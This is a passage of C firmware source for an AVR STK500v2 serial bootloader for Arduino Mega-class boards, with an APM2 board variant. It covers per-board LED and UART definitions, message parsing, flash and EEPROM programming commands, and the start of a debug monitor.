//************************************************************************
//*	LED on pin "PROGLED_PIN" on port "PROGLED_PORT"
//*	indicates that bootloader is active
//*	PG2 -> LED on Wiring board
//************************************************************************
#define		BLINK_LED_WHILE_WAITING

#ifdef _MEGA_BOARD_
/*
	#define PROGLED_PORT	PORTB
	#define PROGLED_DDR		DDRB
	#define PROGLED_PIN		PINB7
*/
// APM2 -- 27,26,25 
//    PA  , // PA 3 ** 25 ** D25
//    PA  , // PA 4 ** 26 ** D26
//    PA  , // PA 5 ** 27 ** D27
    #define PROGLED_PORT    PORTA
    #define PROGLED_DDR     DDRA
    #define PROGLED_PIN     PINB3  // LED C the bright blue one
#elif defined( _BOARD_AMBER128_ )
	//*	this is for the amber 128 http://www.soc-robotics.com/
	//*	onbarod led is PORTE4
	#define PROGLED_PORT	PORTD
	#define PROGLED_DDR		DDRD
	#define PROGLED_PIN		PINE7
#elif defined( _CEREBOTPLUS_BOARD_ )
	//*	this is for the Cerebot 2560 board
	//*	onbarod leds are on PORTE4-7
	#define PROGLED_PORT	PORTE
	#define PROGLED_DDR		DDRE
	#define PROGLED_PIN		PINE7
#elif defined( _PENGUINO_ )
	//*	this is for the Penguino
	//*	onbarod led is PORTE4
	#define PROGLED_PORT	PORTC
	#define PROGLED_DDR		DDRC
	#define PROGLED_PIN		PINC6
#elif defined( _ANDROID_2561_ ) || defined( __AVR_ATmega2561__ )
	//*	this is for the Boston Android 2561
	//*	onbarod led is PORTE4
	#define PROGLED_PORT	PORTA
	#define PROGLED_DDR		DDRA
	#define PROGLED_PIN		PINA3
#elif defined( BOARD_MEGA16 )
	//*	onbarod led is PORTA7
	#define PROGLED_PORT	PORTA
	#define PROGLED_DDR		DDRA
	#define PROGLED_PIN		PINA7
	#define UART_BAUDRATE_DOUBLE_SPEED 0

#elif defined( _BOARD_BAHBOT_ )
	//*	dosent have an onboard LED but this is what will probably be added to this port
	#define PROGLED_PORT	PORTB
	#define PROGLED_DDR		DDRB
	#define PROGLED_PIN		PINB0

#elif defined( _BOARD_ROBOTX_ )
	#define PROGLED_PORT	PORTB
	#define PROGLED_DDR		DDRB
	#define PROGLED_PIN		PINB6
#else
	#define PROGLED_PORT	PORTG
	#define PROGLED_DDR		DDRG
	#define PROGLED_PIN		PING2
#endif



/*
 * define CPU frequency in Mhz here if not defined in Makefile
 */
#ifndef F_CPU
	#define F_CPU 16000000UL
#endif

/*
 * UART Baudrate, AVRStudio AVRISP only accepts 115200 bps
 */

#ifndef BAUDRATE
	#define BAUDRATE 115200
#endif

/*
 *  Enable (1) or disable (0) USART double speed operation
 */
#ifndef UART_BAUDRATE_DOUBLE_SPEED
	#if defined (__AVR_ATmega32__)
		#define UART_BAUDRATE_DOUBLE_SPEED 0
	#else
		#define UART_BAUDRATE_DOUBLE_SPEED 1
	#endif
#endif

/*
 * HW and SW version, reported to AVRISP, must match version of AVRStudio
 */
#define CONFIG_PARAM_BUILD_NUMBER_LOW	0
#define CONFIG_PARAM_BUILD_NUMBER_HIGH	0
#define CONFIG_PARAM_HW_VER				0x0F
#define CONFIG_PARAM_SW_MAJOR			2
#define CONFIG_PARAM_SW_MINOR			0x0A

/*
 * Calculate the address where the bootloader starts from FLASHEND and BOOTSIZE
 * (adjust BOOTSIZE below and BOOTLOADER_ADDRESS in Makefile if you want to change the size of the bootloader)
 */
//#define BOOTSIZE 1024
#if FLASHEND > 0x0F000
	#define BOOTSIZE 8192
#else
	#define BOOTSIZE 2048
#endif

#define APP_END  (FLASHEND -(2*BOOTSIZE) + 1)

/*
 * Signature bytes are not available in avr-gcc io_xxx.h
 */
#if defined (__AVR_ATmega8__)
	#define SIGNATURE_BYTES 0x1E9307
#elif defined (__AVR_ATmega16__)
	#define SIGNATURE_BYTES 0x1E9403
#elif defined (__AVR_ATmega32__)
	#define SIGNATURE_BYTES 0x1E9502
#elif defined (__AVR_ATmega8515__)
	#define SIGNATURE_BYTES 0x1E9306
#elif defined (__AVR_ATmega8535__)
	#define SIGNATURE_BYTES 0x1E9308
#elif defined (__AVR_ATmega162__)
	#define SIGNATURE_BYTES 0x1E9404
#elif defined (__AVR_ATmega128__)
	#define SIGNATURE_BYTES 0x1E9702
#elif defined (__AVR_ATmega1280__)
	#define SIGNATURE_BYTES 0x1E9703
#elif defined (__AVR_ATmega2560__)
	#define SIGNATURE_BYTES 0x1E9801
#elif defined (__AVR_ATmega2561__)
	#define SIGNATURE_BYTES 0x1e9802
#elif defined (__AVR_ATmega1284P__)
	#define SIGNATURE_BYTES 0x1e9705
#elif defined (__AVR_ATmega640__)
	#define SIGNATURE_BYTES  0x1e9608
#else
	#error "no signature definition for MCU available"
#endif



#if defined(_BOARD_ROBOTX_)
	#define	UART_BAUD_RATE_LOW			UBRR1L
	#define	UART_STATUS_REG				UCSR1A
	#define	UART_CONTROL_REG			UCSR1B
	#define	UART_ENABLE_TRANSMITTER		TXEN1
	#define	UART_ENABLE_RECEIVER		RXEN1
	#define	UART_TRANSMIT_COMPLETE		TXC1
	#define	UART_RECEIVE_COMPLETE		RXC1
	#define	UART_DATA_REG				UDR1
	#define	UART_DOUBLE_SPEED			U2X1

#elif defined(__AVR_ATmega8__) || defined(__AVR_ATmega16__) || defined(__AVR_ATmega32__) \
	|| defined(__AVR_ATmega8515__) || defined(__AVR_ATmega8535__)
	/* ATMega8 with one USART */
	#define	UART_BAUD_RATE_LOW			UBRRL
	#define	UART_STATUS_REG				UCSRA
	#define	UART_CONTROL_REG			UCSRB
	#define	UART_ENABLE_TRANSMITTER		TXEN
	#define	UART_ENABLE_RECEIVER		RXEN
	#define	UART_TRANSMIT_COMPLETE		TXC
	#define	UART_RECEIVE_COMPLETE		RXC
	#define	UART_DATA_REG				UDR
	#define	UART_DOUBLE_SPEED			U2X

#elif defined(__AVR_ATmega64__) || defined(__AVR_ATmega128__) || defined(__AVR_ATmega162__) \
	 || defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__) || defined(__AVR_ATmega2561__)
	/* ATMega with two USART, use UART0 */
	#define	UART_BAUD_RATE_LOW			UBRR0L
	#define	UART_STATUS_REG				UCSR0A
	#define	UART_CONTROL_REG			UCSR0B
	#define	UART_ENABLE_TRANSMITTER		TXEN0
	#define	UART_ENABLE_RECEIVER		RXEN0
	#define	UART_TRANSMIT_COMPLETE		TXC0
	#define	UART_RECEIVE_COMPLETE		RXC0
	#define	UART_DATA_REG				UDR0
	#define	UART_DOUBLE_SPEED			U2X0
#elif defined(UBRR0L) && defined(UCSR0A) && defined(TXEN0)
	/* ATMega with two USART, use UART0 */
	#define	UART_BAUD_RATE_LOW			UBRR0L
	#define	UART_STATUS_REG				UCSR0A
	#define	UART_CONTROL_REG			UCSR0B
	#define	UART_ENABLE_TRANSMITTER		TXEN0
	#define	UART_ENABLE_RECEIVER		RXEN0
	#define	UART_TRANSMIT_COMPLETE		TXC0
	#define	UART_RECEIVE_COMPLETE		RXC0
	#define	UART_DATA_REG				UDR0
	#define	UART_DOUBLE_SPEED			U2X0
#else
	#error "no UART definition for MCU available"
#endif



/*
 * Macro to calculate UBBR from XTAL and baudrate
 */
#if defined(__AVR_ATmega32__) && UART_BAUDRATE_DOUBLE_SPEED
	#define UART_BAUD_SELECT(baudRate,xtalCpu) ((xtalCpu / 4 / baudRate - 1) / 2)
#elif defined(__AVR_ATmega32__)
	#define UART_BAUD_SELECT(baudRate,xtalCpu) ((xtalCpu / 8 / baudRate - 1) / 2)
#elif UART_BAUDRATE_DOUBLE_SPEED
	#define UART_BAUD_SELECT(baudRate,xtalCpu) (((float)(xtalCpu))/(((float)(baudRate))*8.0)-1.0+0.5)
#else
	#define UART_BAUD_SELECT(baudRate,xtalCpu) (((float)(xtalCpu))/(((float)(baudRate))*16.0)-1.0+0.5)
#endif


/*
 * States used in the receive state machine
 */
#define	ST_START		0
#define	ST_GET_SEQ_NUM	1
#define ST_MSG_SIZE_1	2
#define ST_MSG_SIZE_2	3
#define ST_GET_TOKEN	4
#define ST_GET_DATA		5
#define	ST_GET_CHECK	6
#define	ST_PROCESS		7

/*
 * use 16bit address variable for ATmegas with <= 64K flash
 */
#if defined(RAMPZ)
	typedef uint32_t address_t;
#else
	typedef uint16_t address_t;
#endif

/*
 * function prototypes
 */
static void sendchar(char c);
static unsigned char recchar(void);

/*
 * since this bootloader is not linked against the avr-gcc crt1 functions,
 * to reduce the code size, we need to provide our own initialization
 */
void __jumpMain	(void) __attribute__ ((naked)) __attribute__ ((section (".init9")));
#include <avr/sfr_defs.h>

//#define	SPH_REG	0x3E
//#define	SPL_REG	0x3D

//*****************************************************************************
void __jumpMain(void)
{
//*	July 17, 2010	<MLS> Added stack pointer initialzation
//*	the first line did not do the job on the ATmega128

	asm volatile ( ".set __stack, %0" :: "i" (RAMEND) );

//	ldi r16,high(RAMEND)
//	out SPH,r16 ; Set stack pointer to top of RAM

//	asm volatile ( "ldi	16, 0x10");
	asm volatile ( "ldi	16, %0" :: "i" (RAMEND >> 8) );
//	asm volatile ( "out 0x3E,16");
//	asm volatile ( "out %0,16" :: "i" (SPH_REG) );
	asm volatile ( "out %0,16" :: "i" (AVR_STACK_POINTER_HI_ADDR) );

//	asm volatile ( "ldi	16, 0x00");
	asm volatile ( "ldi	16, %0" :: "i" (RAMEND & 0x0ff) );
//	asm volatile ( "out 0x3d,16");
//	asm volatile ( "out %0,16" :: "i" (SPL_REG) );
	asm volatile ( "out %0,16" :: "i" (AVR_STACK_POINTER_LO_ADDR) );



	asm volatile ( "clr __zero_reg__" );									// GCC depends on register r1 set to 0
	asm volatile ( "out %0, __zero_reg__" :: "I" (_SFR_IO_ADDR(SREG)) );	// set SREG to 0
//	asm volatile ( "rjmp main");											// jump to main()
	asm volatile ( "jmp main");												// jump to main()
}


//*****************************************************************************
void delay_ms(unsigned int timedelay)
{
	unsigned int i;
	for (i=0;i<timedelay;i++)
	{
		_delay_ms(0.5);
	}
}


//*****************************************************************************
/*
 * send single byte to USART, wait until transmission is completed
 */
static void sendchar(char c)
{
	UART_DATA_REG	=	c;										// prepare transmission
	while (!(UART_STATUS_REG & (1 << UART_TRANSMIT_COMPLETE)));	// wait until byte sent
	UART_STATUS_REG |= (1 << UART_TRANSMIT_COMPLETE);			// delete TXCflag
}


//************************************************************************
static int	Serial_Available(void)
{
	return(UART_STATUS_REG & (1 << UART_RECEIVE_COMPLETE));	// wait for data
}


//*****************************************************************************
/*
 * Read single byte from USART, block if no data available
 */
static unsigned char recchar(void)
{
	while (!(UART_STATUS_REG & (1 << UART_RECEIVE_COMPLETE)))
	{
		// wait for data
	}
	return UART_DATA_REG;
}

#define	MAX_TIME_COUNT	(F_CPU >> 1)
//*****************************************************************************
static unsigned char recchar_timeout(void)
{
uint32_t count = 0;

	while (!(UART_STATUS_REG & (1 << UART_RECEIVE_COMPLETE)))
	{
		// wait for data
		count++;
		if (count > MAX_TIME_COUNT)
		{
		unsigned int	data;
		#if (FLASHEND > 0x10000)
			data	=	pgm_read_word_far(0);	//*	get the first word of the user program
		#else
			data	=	pgm_read_word_near(0);	//*	get the first word of the user program
		#endif
			if (data != 0xffff)					//*	make sure it's valid before jumping to it.
			{
				asm volatile(
						"clr	r30		\n\t"
						"clr	r31		\n\t"
						"ijmp	\n\t"
						);
			}
			count	=	0;
		}
	}
	return UART_DATA_REG;
}

void (*app_start)(void) = 0x0000;

//*****************************************************************************
int main(void)
{
	address_t		address			=	0;
	address_t		eraseAddress	=	0;
	unsigned char	msgParseState;
	unsigned int	ii				=	0;
	unsigned char	checksum		=	0;
	unsigned char	seqNum			=	0;
	unsigned int	msgLength		=	0;
	unsigned char	msgBuffer[285];
	unsigned char	c, *p;
	unsigned char   isLeave = 0;

	unsigned long	boot_timeout;
	unsigned long	boot_timer;
	unsigned int	boot_state;
#ifdef ENABLE_MONITOR
	unsigned int	exPointCntr	=	0;
#endif

	uint8_t ch;
	ch = MCUSR;

	__asm__ __volatile__ ("cli");
	__asm__ __volatile__ ("wdr");
	MCUSR = 0;
	WDTCSR |= _BV(WDCE) | _BV(WDE);
	WDTCSR = 0;
	__asm__ __volatile__ ("sei");

	// check if WDT generated the reset, if so, go straight to app
	if (ch & _BV(WDRF)) {
            asm volatile(
                    "clr	r30		\n\t"
                    "clr	r31		\n\t"
                    "ijmp	\n\t"
                    );
    }

	boot_timer	=	0;
	boot_state	=	0;

#ifdef BLINK_LED_WHILE_WAITING
	boot_timeout	=	 90000;		//*	should be about 4 seconds
#else
	boot_timeout	=	3500000;    // 7 seconds , approx 2us per step when optimize "s"
#endif
	/*
	 * Branch to bootloader or application code ?
	 */

	/*
	 * Init UART
	 * set baudrate and enable USART receiver and transmiter without interrupts
	 */
#if UART_BAUDRATE_DOUBLE_SPEED
	UART_STATUS_REG		|=	(1 <<UART_DOUBLE_SPEED);
#endif
	UART_BAUD_RATE_LOW	=	UART_BAUD_SELECT(BAUDRATE,F_CPU);
	UART_CONTROL_REG	=	(1 << UART_ENABLE_RECEIVER) | (1 << UART_ENABLE_TRANSMITTER);

	asm volatile ("nop");			// wait until port has changed

#ifndef REMOVE_BOOTLOADER_LED
	/* PROG_PIN pulled low, indicate with LED that bootloader is active */
	PROGLED_DDR		|=	((1<<PINB3)|(1<<PINB4)|(1<<PINB5));
    // turn them all off
	PROGLED_PORT	|=	((1<<PINB3)|(1<<PINB4)|(1<<PINB5));

#endif

#if defined(__AVR_ATmega2560__)
    // Check for hardware ident as an APM2 board
    // if (PINK & 3) { // 2560 A8 and A9 are HIGH
        // pin 23 is PA1,23,D23  and is BV(1) --> DDRA

        int usb_connected = !(PINA & 2);
        if (!usb_connected) {
            // Start sketch immediately if a USB connection is not detected
            for (ii=0; ii<2; ii++)
            {
                PROGLED_PORT	&=	~(1<<PROGLED_PIN);	// turn LED on
                delay_ms(100);
                PROGLED_PORT	|=	(1<<PROGLED_PIN);	// turn LED off
                delay_ms(100);
            }
            for (ii=0; ii<2; ii++)
            {
                PROGLED_PORT	&=	~(1<<PINB4);	    // turn LED on
                delay_ms(100);
                PROGLED_PORT	|=	(1<<PINB4);	// turn LED off
            }
            delay_ms(500);
            asm volatile(
                    "clr	r30		\n\t"
                    "clr	r31		\n\t"
                    "ijmp	\n\t"
                    );
            //app_start();
	        for(;;);
        } 
    //}
#endif

#ifdef _DEBUG_SERIAL_
//	delay_ms(500);

	sendchar('s');
	sendchar('t');
	sendchar('k');
//	sendchar('5');
//	sendchar('0');
//	sendchar('0');
	sendchar('v');
	sendchar('2');
	sendchar(0x0d);
	sendchar(0x0a);

	delay_ms(100);
#endif

	while (boot_state==0)
	{
		while ((!(Serial_Available())) && (boot_state == 0))		// wait for data
		{
			_delay_ms(0.001);
			boot_timer++;
			if (boot_timer > boot_timeout)
			{
				boot_state	=	1; // (after ++ -> boot_state=2 bootloader timeout, jump to main 0x00000 )
			}
		#ifdef BLINK_LED_WHILE_WAITING
			if ((boot_timer % 7000) == 0)
			{
				//*	toggle the LED
				PROGLED_PORT	^=	(1<<PROGLED_PIN);	// turn LED ON
			}
		#endif
		}
        boot_state++; // ( if boot_state=1 bootloader received byte from UART, enter bootloader mode)
	}

    boot_timer = 0;
	if (boot_state==1)
	{
		//*	main loop
		while (!isLeave)
		{
			/*
			 * Collect received bytes to a complete message
			 */
			msgParseState	=	ST_START;
			while ( msgParseState != ST_PROCESS )
			{
                if (boot_timer > 32) {
                    isLeave = 1;
                    msgParseState = 99;
                    break;
                }

				if (boot_state==1)
				{
					boot_state	=	0;
					c			=	UART_DATA_REG;
				}
				else
				{
				//	c	=	recchar();
					c	=	recchar_timeout();
				}

			#ifdef ENABLE_MONITOR
				if (c == '!')
				{
					exPointCntr++;
					if (exPointCntr == 3)
					{
						RunMonitor();
						exPointCntr		=	0;	//	reset back to zero so we don't get in an endless loop
						isLeave			=	1;
						msgParseState	=	99;	//*	we don't want it do anything
						break;
					}
				}
				else
				{
					exPointCntr	=	0;
				}
			#endif

				switch (msgParseState)
				{
					case ST_START:
						if ( c == MESSAGE_START )
						{
							msgParseState	=	ST_GET_SEQ_NUM;
							checksum		=	MESSAGE_START^0;
						} else {
                            boot_timer++;
                        }
						break;

					case ST_GET_SEQ_NUM:
						if ( (c == 1) || (c == seqNum) )
						{
							seqNum			=	c;
							msgParseState	=	ST_MSG_SIZE_1;
							checksum		^=	c;
						}
						else
						{
							msgParseState	=	ST_START;
						}
						break;

					case ST_MSG_SIZE_1:
						msgLength		=	c<<8;
						msgParseState	=	ST_MSG_SIZE_2;
						checksum		^=	c;
						break;

					case ST_MSG_SIZE_2:
						msgLength		|=	c;
						msgParseState	=	ST_GET_TOKEN;
						checksum		^=	c;
						break;

					case ST_GET_TOKEN:
						if ( c == TOKEN )
						{
							msgParseState	=	ST_GET_DATA;
							checksum		^=	c;
							ii				=	0;
						}
						else
						{
							msgParseState	=	ST_START;
						}
						break;

					case ST_GET_DATA:
						msgBuffer[ii++]	=	c;
						checksum		^=	c;
						if (ii == msgLength )
						{
							msgParseState	=	ST_GET_CHECK;
						}
						break;

					case ST_GET_CHECK:
						if ( c == checksum )
						{
							msgParseState	=	ST_PROCESS;
						}
						else
						{
							msgParseState	=	ST_START;
						}
						break;
				}	//	switch
			}	//	while(msgParseState)

            if (msgParseState == 99) {
                continue;
            }

			/*
			 * Now process the STK500 commands, see Atmel Appnote AVR068
			 */

			switch (msgBuffer[0])
			{
	#ifndef REMOVE_CMD_SPI_MULTI
				case CMD_SPI_MULTI:
					{
						unsigned char answerByte;
						unsigned char flag=0;

						if ( msgBuffer[4]== 0x30 )
						{
							unsigned char signatureIndex	=	msgBuffer[6];

							if ( signatureIndex == 0 )
								answerByte	=	(SIGNATURE_BYTES >>16) & 0x000000FF;
							else if ( signatureIndex == 1 )
								answerByte	=	(SIGNATURE_BYTES >> 8) & 0x000000FF;
							else
								answerByte	=	SIGNATURE_BYTES & 0x000000FF;
						}
						else if ( msgBuffer[4] & 0x50 )
						{
							answerByte	=	0; //read fuse/lock bits not implemented, return dummy value
						}
						else
						{
							answerByte	=	0; // for all others command are not implemented, return dummy value for AVRDUDE happy <Worapoht>
	//						flag	=	1; // Remark this line for AVRDUDE <Worapoht>
						}
						if ( !flag )
						{
							msgLength		=	7;
							msgBuffer[1]	=	STATUS_CMD_OK;
							msgBuffer[2]	=	0;
							msgBuffer[3]	=	msgBuffer[4];
							msgBuffer[4]	=	0;
							msgBuffer[5]	=	answerByte;
							msgBuffer[6]	=	STATUS_CMD_OK;
						}
					}
					break;
	#endif
				case CMD_SIGN_ON:
					msgLength		=	11;
					msgBuffer[1] 	=	STATUS_CMD_OK;
					msgBuffer[2] 	=	8;
					msgBuffer[3] 	=	'A';
					msgBuffer[4] 	=	'V';
					msgBuffer[5] 	=	'R';
					msgBuffer[6] 	=	'I';
					msgBuffer[7] 	=	'S';
					msgBuffer[8] 	=	'P';
					msgBuffer[9] 	=	'_';
					msgBuffer[10]	=	'2';
					break;

				case CMD_GET_PARAMETER:
					{
						unsigned char value;

						switch(msgBuffer[1])
						{
						case PARAM_BUILD_NUMBER_LOW:
							value	=	CONFIG_PARAM_BUILD_NUMBER_LOW;
							break;
						case PARAM_BUILD_NUMBER_HIGH:
							value	=	CONFIG_PARAM_BUILD_NUMBER_HIGH;
							break;
						case PARAM_HW_VER:
							value	=	CONFIG_PARAM_HW_VER;
							break;
						case PARAM_SW_MAJOR:
							value	=	CONFIG_PARAM_SW_MAJOR;
							break;
						case PARAM_SW_MINOR:
							value	=	CONFIG_PARAM_SW_MINOR;
							break;
						default:
							value	=	0;
							break;
						}
						msgLength		=	3;
						msgBuffer[1]	=	STATUS_CMD_OK;
						msgBuffer[2]	=	value;
					}
					break;

				case CMD_LEAVE_PROGMODE_ISP:
					isLeave	=	1;
					//*	fall through

				case CMD_SET_PARAMETER:
				case CMD_ENTER_PROGMODE_ISP:
					msgLength		=	2;
					msgBuffer[1]	=	STATUS_CMD_OK;
					break;

				case CMD_READ_SIGNATURE_ISP:
					{
						unsigned char signatureIndex	=	msgBuffer[4];
						unsigned char signature;

						if ( signatureIndex == 0 )
							signature	=	(SIGNATURE_BYTES >>16) & 0x000000FF;
						else if ( signatureIndex == 1 )
							signature	=	(SIGNATURE_BYTES >> 8) & 0x000000FF;
						else
							signature	=	SIGNATURE_BYTES & 0x000000FF;

						msgLength		=	4;
						msgBuffer[1]	=	STATUS_CMD_OK;
						msgBuffer[2]	=	signature;
						msgBuffer[3]	=	STATUS_CMD_OK;
					}
					break;

				case CMD_READ_LOCK_ISP:
					msgLength		=	4;
					msgBuffer[1]	=	STATUS_CMD_OK;
					msgBuffer[2]	=	boot_lock_fuse_bits_get( GET_LOCK_BITS );
					msgBuffer[3]	=	STATUS_CMD_OK;
					break;

				case CMD_READ_FUSE_ISP:
					{
						unsigned char fuseBits;

						if ( msgBuffer[2] == 0x50 )
						{
							if ( msgBuffer[3] == 0x08 )
								fuseBits	=	boot_lock_fuse_bits_get( GET_EXTENDED_FUSE_BITS );
							else
								fuseBits	=	boot_lock_fuse_bits_get( GET_LOW_FUSE_BITS );
						}
						else
						{
							fuseBits	=	boot_lock_fuse_bits_get( GET_HIGH_FUSE_BITS );
						}
						msgLength		=	4;
						msgBuffer[1]	=	STATUS_CMD_OK;
						msgBuffer[2]	=	fuseBits;
						msgBuffer[3]	=	STATUS_CMD_OK;
					}
					break;

	#ifndef REMOVE_PROGRAM_LOCK_BIT_SUPPORT
				case CMD_PROGRAM_LOCK_ISP:
					{
						unsigned char lockBits	=	msgBuffer[4];

						lockBits	=	(~lockBits) & 0x3C;	// mask BLBxx bits
						boot_lock_bits_set(lockBits);		// and program it
						boot_spm_busy_wait();

						msgLength		=	3;
						msgBuffer[1]	=	STATUS_CMD_OK;
						msgBuffer[2]	=	STATUS_CMD_OK;
					}
					break;
	#endif
				case CMD_CHIP_ERASE_ISP:
					eraseAddress	=	0;
					msgLength		=	2;
					msgBuffer[1]	=	STATUS_CMD_OK;
					break;

				case CMD_LOAD_ADDRESS:
	#if defined(RAMPZ)
					address	=	( ((address_t)(msgBuffer[1])<<24)|((address_t)(msgBuffer[2])<<16)|((address_t)(msgBuffer[3])<<8)|(msgBuffer[4]) )<<1;
	#else
					address	=	( ((msgBuffer[3])<<8)|(msgBuffer[4]) )<<1;		//convert word to byte address
	#endif
					msgLength		=	2;
					msgBuffer[1]	=	STATUS_CMD_OK;
					break;

				case CMD_PROGRAM_FLASH_ISP:
				case CMD_PROGRAM_EEPROM_ISP:
					{
						unsigned int	size	=	((msgBuffer[1])<<8) | msgBuffer[2];
						unsigned char	*p	=	msgBuffer+10;
						unsigned int	data;
						unsigned char	highByte, lowByte;
						address_t		tempaddress	=	address;


						if ( msgBuffer[0] == CMD_PROGRAM_FLASH_ISP )
						{
							// erase only main section (bootloader protection)
							if (eraseAddress < APP_END )
							{
								boot_page_erase(eraseAddress);	// Perform page erase
								boot_spm_busy_wait();		// Wait until the memory is erased.
								eraseAddress += SPM_PAGESIZE;	// point to next page to be erase
							}

							/* Write FLASH */
							do {
								lowByte		=	*p++;
								highByte 	=	*p++;

								data		=	(highByte << 8) | lowByte;
								boot_page_fill(address,data);

								address	=	address + 2;	// Select next word in memory
								size	-=	2;				// Reduce number of bytes to write by two
							} while (size);					// Loop until all bytes written

							boot_page_write(tempaddress);
							boot_spm_busy_wait();
							boot_rww_enable();				// Re-enable the RWW section
						}
						else
						{
						#if (!defined(__AVR_ATmega1280__) && !defined(__AVR_ATmega2560__)  && !defined(__AVR_ATmega2561__)  && !defined(__AVR_ATmega1284P__)  && !defined(__AVR_ATmega640__))
					//	#if (defined(EEARL) && defined(EEARH)  && defined(EEMWE)  && defined(EEWE)  && defined(EEDR))
							/* write EEPROM */
							do {
								EEARL	=	address;			// Setup EEPROM address
								EEARH	=	(address >> 8);
								address++;						// Select next EEPROM byte

								EEDR	=	*p++;				// get byte from buffer
								EECR	|=	(1<<EEMWE);			// Write data into EEPROM
								EECR	|=	(1<<EEWE);

								while (EECR & (1<<EEWE));	// Wait for write operation to finish
								size--;						// Decrease number of bytes to write
							} while (size);					// Loop until all bytes written
						#endif
						}
							msgLength	=	2;
						msgBuffer[1]	=	STATUS_CMD_OK;
					}
					break;

				case CMD_READ_FLASH_ISP:
				case CMD_READ_EEPROM_ISP:
					{
						unsigned int	size	=	((msgBuffer[1])<<8) | msgBuffer[2];
						unsigned char	*p		=	msgBuffer+1;
						msgLength				=	size+3;

						*p++	=	STATUS_CMD_OK;
						if (msgBuffer[0] == CMD_READ_FLASH_ISP )
						{
							unsigned int data;

							// Read FLASH
							do {
						//#if defined(RAMPZ)
						#if (FLASHEND > 0x10000)
								data	=	pgm_read_word_far(address);
						#else
								data	=	pgm_read_word_near(address);
						#endif
								*p++	=	(unsigned char)data;		//LSB
								*p++	=	(unsigned char)(data >> 8);	//MSB
								address	+=	2;							// Select next word in memory
								size	-=	2;
							}while (size);
						}
						else
						{
							/* Read EEPROM */
							do {
								EEARL	=	address;			// Setup EEPROM address
								EEARH	=	((address >> 8));
								address++;					// Select next EEPROM byte
								EECR	|=	(1<<EERE);			// Read EEPROM
								*p++	=	EEDR;				// Send EEPROM data
								size--;
							} while (size);
						}
						*p++	=	STATUS_CMD_OK;
					}
					break;

				default:
					msgLength		=	2;
					msgBuffer[1]	=	STATUS_CMD_FAILED;
					break;
			}

			/*
			 * Now send answer message back
			 */
			sendchar(MESSAGE_START);
			checksum	=	MESSAGE_START^0;

			sendchar(seqNum);
			checksum	^=	seqNum;

			c			=	((msgLength>>8)&0xFF);
			sendchar(c);
			checksum	^=	c;

			c			=	msgLength&0x00FF;
			sendchar(c);
			checksum ^= c;

			sendchar(TOKEN);
			checksum ^= TOKEN;

			p	=	msgBuffer;
			while ( msgLength )
			{
				c	=	*p++;
				sendchar(c);
				checksum ^=c;
				msgLength--;
			}
			sendchar(checksum);
			seqNum++;
	
		#ifndef REMOVE_BOOTLOADER_LED
			//*	<MLS>	toggle the LED
			PROGLED_PORT	^=	(1<<PROGLED_PIN);	// active high LED ON
		#endif

		}
	}

#ifdef _DEBUG_SERIAL_
	sendchar('j');
//	sendchar('u');
//	sendchar('m');
//	sendchar('p');
//	sendchar(' ');
//	sendchar('u');
//	sendchar('s');
//	sendchar('r');
	sendchar(0x0d);
	sendchar(0x0a);

	delay_ms(100);
#endif


#ifndef REMOVE_BOOTLOADER_LED
	PROGLED_DDR		&=	~(1<<PROGLED_PIN);	// set to default
	PROGLED_PORT	&=	~(1<<PROGLED_PIN);	// active low LED OFF
//	PROGLED_PORT	|=	(1<<PROGLED_PIN);	// active high LED OFf
	delay_ms(100);							// delay after exit
#endif

	asm volatile ("nop");			// wait until port has changed

	/*
	 * Now leave bootloader
	 */

	UART_STATUS_REG	&=	0xfd;
	boot_rww_enable();				// enable application section

	asm volatile(
			"clr	r30		\n\t"
			"clr	r31		\n\t"
			"ijmp	\n\t"
			);
//	asm volatile ( "push r1" "\n\t"		// Jump to Reset vector in Application Section
//					"push r1" "\n\t"
//					"ret"	 "\n\t"
//					::);

	 /*
	 * Never return to stop GCC to generate exit return code
	 * Actually we will never reach this point, but the compiler doesn't
	 * understand this
	 */
	for(;;);
}

/*
base address = f800

avrdude: Device signature = 0x1e9703
avrdude: safemode: lfuse reads as FF
avrdude: safemode: hfuse reads as DA
avrdude: safemode: efuse reads as F5
avrdude>


base address = f000
avrdude: Device signature = 0x1e9703
avrdude: safemode: lfuse reads as FF
avrdude: safemode: hfuse reads as D8
avrdude: safemode: efuse reads as F5
avrdude>
*/

//************************************************************************
#ifdef ENABLE_MONITOR
#include	<math.h>

unsigned long	gRamIndex;
unsigned long	gFlashIndex;
unsigned long	gEepromIndex;


#define	true	1
#define	false	0

#if defined(__AVR_ATmega128__)
	#define	kCPU_NAME	"ATmega128"
#elif defined(__AVR_ATmega1280__)
	#define	kCPU_NAME	"ATmega1280"
#elif defined(__AVR_ATmega1281__)
	#define	kCPU_NAME	"ATmega1281"
#elif defined(__AVR_ATmega2560__)
	#define	kCPU_NAME	"ATmega2560"
#elif defined(__AVR_ATmega2561__)
	#define	kCPU_NAME	"ATmega2561"
#elif defined(__AVR_ATmega1284P__)
	#define	kCPU_NAME	"ATmega1284P"
#elif defined(__AVR_ATmega640__)
	#define	kCPU_NAME	"ATmega640"
#else
	#error cpu name not defined
#endif

#ifdef _VECTORS_SIZE
	#define	kInterruptVectorCount (_VECTORS_SIZE / 4)
#else
	#define	kInterruptVectorCount 23
#endif


void	PrintDecInt(int theNumber, int digitCnt);

#ifdef kCPU_NAME
	prog_char	gTextMsg_CPU_Name[]			PROGMEM	=	kCPU_NAME;
#else
	prog_char	gTextMsg_CPU_Name[]			PROGMEM	=	"UNKNOWN";
#endif

	prog_char	gTextMsg_Explorer[]			PROGMEM	=	"Arduino explorer stk500V2 by MLS";
	prog_char	gTextMsg_Prompt[]			PROGMEM	=	"Bootloader>";
	prog_char	gTextMsg_HUH[]				PROGMEM	=	"Huh?";
	prog_char	gTextMsg_COMPILED_ON[]		PROGMEM	=	"Compiled on  = ";
	prog_char	gTextMsg_CPU_Type[]			PROGMEM	=	"CPU Type     = ";
	prog_char	gTextMsg_AVR_ARCH[]			PROGMEM	=	"__AVR_ARCH__ = ";
	prog_char	gTextMsg_AVR_LIBC[]			PROGMEM	=	"AVR LibC Ver = ";
	prog_char	gTextMsg_GCC_VERSION[]		PROGMEM	=	"GCC Version  = ";
	prog_char	gTextMsg_CPU_SIGNATURE[]	PROGMEM	=	"CPU signature= ";
	prog_char	gTextMsg_FUSE_BYTE_LOW[]	PROGMEM	=	"Low fuse     = ";
	prog_char	gTextMsg_FUSE_BYTE_HIGH[]	PROGMEM	=	"High fuse    = ";
	prog_char	gTextMsg_FUSE_BYTE_EXT[]	PROGMEM	=	"Ext fuse     = ";
